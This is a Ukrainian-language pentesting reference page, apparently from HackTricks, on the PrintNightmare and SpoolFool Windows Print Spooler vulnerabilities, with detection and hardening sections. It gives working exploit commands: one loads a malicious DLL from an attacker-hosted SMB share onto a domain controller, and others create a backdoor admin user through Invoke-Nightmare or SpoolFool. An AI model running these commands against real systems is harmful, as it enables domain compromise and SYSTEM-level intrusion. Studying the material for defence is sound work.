# PrintNightmare (RCE/LPE у Windows Print Spooler)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare — це загальна назва сімейства вразливостей у службі Windows **Print Spooler**, які дають змогу **виконувати довільний код від імені SYSTEM**, а коли до spooler можна підключитися через RPC, — **віддалено виконувати код (RCE) на контролерах домену та файлових серверах**. Найчастіше експлуатували CVE **CVE-2021-1675** (спочатку класифіковану як LPE) і **CVE-2021-34527** (повна RCE). Пізніші вразливості, як-от **CVE-2021-34481 (“Point & Print”)** і **CVE-2022-21999 (“SpoolFool”)**, доводять, що поверхню атаки досі далеко не закрито.

Якщо вас цікавить **примусова автентифікація / relay** через spooler, а не **RCE/LPE через драйвери**, дивіться [цю іншу сторінку про зловживання примусовим друком](printers-spooler-service-abuse.md). Ця сторінка присвячена **завантаженню драйверів / DLL від імені SYSTEM**.

---

## 1. Вразливі компоненти та CVE

| Рік | CVE | Коротка назва | Примітив | Примітки |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Виправлено в оновленні CU за червень 2021 року, але обійдено за допомогою CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` дає змогу автентифікованим користувачам завантажувати DLL драйвера з віддаленого ресурсу; після серпня 2021 року для цього зазвичай потрібні послаблені політики Point & Print|
|2021|CVE-2021-34481|“Point & Print”|LPE|Встановлення непідписаних драйверів користувачами без прав адміністратора|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Створення довільних каталогів → розміщення DLL — працює після виправлень 2021 року|

Усі вони зловживають одним із **методів MS-RPRN / MS-PAR RPC** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) або відносинами довіри в **Point & Print**.

## 2. Техніки експлуатації

### 2.1 Компрометація віддаленого контролера домену (CVE-2021-34527)

Автентифікований, але **непривілейований** користувач домену може запускати довільні DLL від імені **NT AUTHORITY\SYSTEM** на віддаленому spooler (часто на контролері домену), якщо:

```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
       -f \
       '\\attacker_IP\share\evil.dll'
```

Популярні PoC включають **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) і модулі `misc::printnightmare / lsa::addsid` Бенджаміна Дельпі в **mimikatz**.

### 2.2 Локальне підвищення привілеїв (будь-яка підтримувана версія Windows, 2021–2024)

Той самий API можна викликати **локально**, щоб завантажити драйвер із `C:\Windows\System32\spool\drivers\x64\3\` і отримати привілеї SYSTEM:

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```

### 2.3 Сучасний тріаж на пропатчених хостах

На повністю оновленому хості публічні PoC для PrintNightmare часто не спрацьовують, оскільки Windows тепер за замовчуванням дозволяє встановлювати драйвери принтерів **лише адміністраторам** (`RestrictDriverInstallationToAdministrators=1` із 10 серпня 2021 року). Перш ніж запускати exploit проти цілі, спершу перевірте, чи не скасували в середовищі цю міру безпеки для застарілих розгортань принтерів:<sup>[[3]](#references)</sup>

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```

Два найцікавіші слабкі значення зазвичай такі:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

У Linux швидко перевірте, чи на цілі доступні відповідні інтерфейси print RPC, перш ніж запускати PoC:

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

Деякі новіші загальнодоступні інструменти також дають змогу скористатися безпечнішим процесом **перевірки/перегляду списку** перед надсиланням DLL:

```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```

> Якщо ви отримуєте `RPC_E_ACCESS_DENIED` (`0x8001011b`) із низькопривілейованого облікового запису, зазвичай це означає, що ви зіткнулися з типовою поведінкою після 2021 року, а не зі збоєм транспорту.

> У Windows 11 22H2+ і новіших клієнтських збірках віддалений друк за замовчуванням використовує **RPC через TCP**, а **RPC через іменовані канали** (`\PIPE\spoolss`) вимкнено, якщо його не ввімкнути явно. У деяких старіших PoC і нотатках до лабораторних робіт досі припускається, що іменований канал доступний.<sup>[[4]](#references)</sup>

### 2.4 Зловживання Package Point & Print у «виправлених» мережах

У багатьох корпоративних середовищах політики залишалися **вразливими** й після початкових виправлень 2021 року, оскільки для процесів служби підтримки або серверів друку й надалі було потрібно, щоб користувачі без прав адміністратора встановлювали й оновлювали драйвери. На практиці план дій зловмисника такий:

- Якщо запити безпеки повністю вимкнені, **класичний PrintNightmare із довільною DLL** і далі є найкоротшим шляхом.
- Якщо ввімкнено `Only use Package Point and Print`, зазвичай потрібно перейти до сценарію з **підписаним драйвером, сумісним із пакетами**, а не просто розмістити DLL.<sup>[[3]](#references)</sup>
- Дослідження 2024 року показало, що **`Package Point and Print - Approved servers` саме по собі не є надійною межею довіри**: якщо зловмисник може підмінити або перехопити розпізнавання імен для одного дозволеного сервера друку, жертв усе одно можна перенаправити на шкідливий сервер, який відповідає перевіркам політики.<sup>[[4]](#references)</sup>
- Навіть поєднання посилення безпеки UNC із примусовим використанням RPC через SMB може бути ненадійним, оскільки сучасні клієнти можуть **перейти на RPC через TCP**.<sup>[[4]](#references)</sup>

Саме тому сучасна експлуатація в стилі PrintNightmare часто пов’язана радше зі **зловживанням політиками розгортання принтерів у корпоративному середовищі**, ніж із повторним використанням оригінального PoC 2021 року без змін.

### 2.5 SpoolFool (CVE-2022-21999) — обхід виправлень 2021 року

Виправлення Microsoft 2021 року блокували завантаження віддалених драйверів, але **не посилювали дозволи на каталоги**. SpoolFool зловживає параметром `SpoolDirectory`, щоб створити довільний каталог у `C:\Windows\System32\spool\drivers\`, розмістити DLL-пейлоад і змусити спулер завантажити його:<sup>[[2]](#references)</sup>

```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```

> Експлойт працює на повністю оновлених Windows 7 → Windows 11 і Server 2012R2 → 2022 до встановлення оновлень за лютий 2022 року<sup>[[2]](#references)</sup>

---

## 3. Виявлення та пошук загроз

* **Журнали PrintService** – увімкніть канал *Microsoft-Windows-PrintService/Operational* і стежте за **Event ID 316** (додано/оновлено драйвер; зазвичай містить назви DLL) як для успішних, так і для невдалих спроб. Перевіряйте також **Event ID 808/811** на наявність підозрілих помилок завантаження модулів/драйверів spooler.
* **Sysmon** – `Event ID 7` (завантаження образу) або `11/23` (запис/видалення файлу) у `C:\Windows\System32\spool\drivers\*`, коли батьківський процес — **spoolsv.exe**.
* **Походження процесів** – створюйте сповіщення щоразу, коли **spoolsv.exe** запускає `cmd.exe`, `rundll32.exe`, PowerShell або будь-який неочікуваний непідписаний дочірній процес.
* **Телеметрія мережі** – неочікувані SMB-запити від **spoolsv.exe** до контрольованих зловмисником спільних ресурсів або незвичний трафік Printer RPC із серверів, які не мають працювати як сервери друку, — це важливі сигнали для подальшої перевірки.

## 4. Усунення вразливості та посилення захисту

1. **Встановіть оновлення!** – застосуйте найновіше сукупне оновлення на кожному хості Windows, де встановлено службу Print Spooler.
2. **Вимкніть spooler там, де він не потрібен**, особливо на контролерах домену:
   ```powershell
   Stop-Service Spooler -Force
   Set-Service Spooler -StartupType Disabled
   ```
3. **Блокуйте віддалені підключення**, залишивши можливість локального друку — Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Залиште Point & Print лише для адміністраторів**, встановивши:
   ```cmd
   reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
           /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
   ```
   Детальні рекомендації в Microsoft KB5005652<sup>[[1]](#references)</sup>
5. Якщо бізнес-вимоги змушують установити `RestrictDriverInstallationToAdministrators=0`, вважайте всі інші політики принтерів лише **частковими заходами захисту**. Як мінімум, віддавайте перевагу **драйверам із підтримкою пакетів**, увімкніть **Only use Package Point and Print** і обмежте **Package Point and Print - Approved servers** явно визначеними серверами друку в лісі.<sup>[[3]](#references)</sup>
6. **Не скасовуйте захист конфіденційності RPC для принтера** лише для того, щоб виправити непрацюючі зіставлення принтерів. Середовища, у яких встановлено `RpcAuthnLevelPrivacyEnabled=0`, скасовують посилення захисту, додане для **CVE-2021-1678**, і зазвичай потребують додаткової уваги під час оцінювання безпеки.<sup>[[4]](#references)</sup>

---

## 5. Пов’язані дослідження / інструменти

* Модулі [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – стандартна реалізація на Impacket з режимами `-check`, `-list` і `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – обгортка з вбудованою доставкою через SMB, підтримкою кількох цілей і режимами `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – зловживання вразливим драйвером принтера, який ви надаєте, через package Point & Print
* Експлойт SpoolFool і його технічний опис
* Мікропатчі 0patch для SpoolFool та інших помилок spooler

Якщо ви хочете **примусово викликати автентифікацію** через spooler замість завантаження драйвера, перейдіть до розділу [зловживання службою диспетчера черги друку](printers-spooler-service-abuse.md).

---

## References

- [1] [Microsoft – KB5005652: керування новою поведінкою Point & Print за замовчуванням під час установлення драйверів](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – практичний посібник із PrintNightmare у 2024 році](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – PrintNightmare ще не скінчився](https://itm4n.github.io/printnightmare-not-over/)
{{#include ../../banners/hacktricks-training.md}}
